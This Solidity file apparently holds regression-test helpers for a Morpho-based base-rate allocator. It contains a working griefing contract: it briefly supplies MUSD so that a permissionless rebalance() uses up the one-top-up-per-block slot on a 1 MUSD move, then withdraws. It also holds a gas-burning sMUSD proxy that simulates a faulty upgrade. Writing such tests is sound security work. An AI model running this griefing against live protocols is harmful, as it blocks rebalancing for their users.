// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IMorpho, Market, MarketParams} from "morpho-blue/interfaces/IMorpho.sol";
import {MarketParamsLib} from "morpho-blue/libraries/MarketParamsLib.sol";

import {IBaserateAllocator} from "../../src/interfaces/IBaserateAllocator.sol";

/// @notice Consumes the allocator's one-buffer-top-up-per-block slot with a 1 MUSD top-up. In one transaction it
/// supplies just enough MUSD to M1 to leave a `MIN_MOVE` deficit against the 2,000 MUSD floor, calls the permissionless
/// `rebalance()` (which tops up exactly `MIN_MOVE` and records `lastTopUpAt = now`), then withdraws its supply. Any
/// later `rebalance()` in the same block sees the slot taken and does nothing. The capital is returned in the same
/// transaction (minus at most 1 wei of Morpho share rounding); only gas is spent.
contract R3RegTopUpSlotGriefer {
    using MarketParamsLib for MarketParams;

    uint256 internal constant BUFFER_FLOOR = 2000e18;
    uint256 internal constant MIN_MOVE = 1e18;

    IMorpho internal immutable MORPHO;
    IBaserateAllocator internal immutable ALLOCATOR;
    IERC20 internal immutable MUSD;
    MarketParams internal params;

    constructor(IMorpho morpho, IBaserateAllocator allocator, IERC20 musd, MarketParams memory params_) {
        MORPHO = morpho;
        ALLOCATOR = allocator;
        MUSD = musd;
        params = params_;
        musd.approve(address(morpho), type(uint256).max);
    }

    /// @return action What the griefing `rebalance()` did.
    /// @return amount What it moved into M1.
    function grief() external returns (IBaserateAllocator.Action action, uint256 amount) {
        MORPHO.accrueInterest(params);
        Market memory m = MORPHO.market(params.id());
        uint256 liquidity = uint256(m.totalSupplyAssets) - m.totalBorrowAssets;
        require(liquidity + MIN_MOVE < BUFFER_FLOOR, "no floor deficit");
        uint256 y = BUFFER_FLOOR - liquidity - MIN_MOVE;
        (, uint256 shares) = MORPHO.supply(params, y, 0, address(this), "");
        (action, amount) = ALLOCATOR.rebalance();
        MORPHO.withdraw(params, 0, shares, address(this), address(this));
    }
}

/// @notice Stand-in for an sMUSD upgrade whose `withdraw` fails by burning all the gas it is given (an INVALID opcode
/// or an unbounded loop) instead of reverting cheaply. Etched over the sMUSD address, it delegates every other call to
/// an unmodified SMUSDMock implementation, so sMUSD's storage (balances, yield index) is kept as it was.
contract R3GasBurnSMUSDProxy {
    bytes4 internal constant WITHDRAW = bytes4(keccak256("withdraw(uint256)"));
    address internal immutable IMPL;

    constructor(address impl) {
        IMPL = impl;
    }

    fallback() external payable {
        if (msg.sig == WITHDRAW) {
            assembly ("memory-safe") {
                invalid()
            }
        }
        address impl = IMPL;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
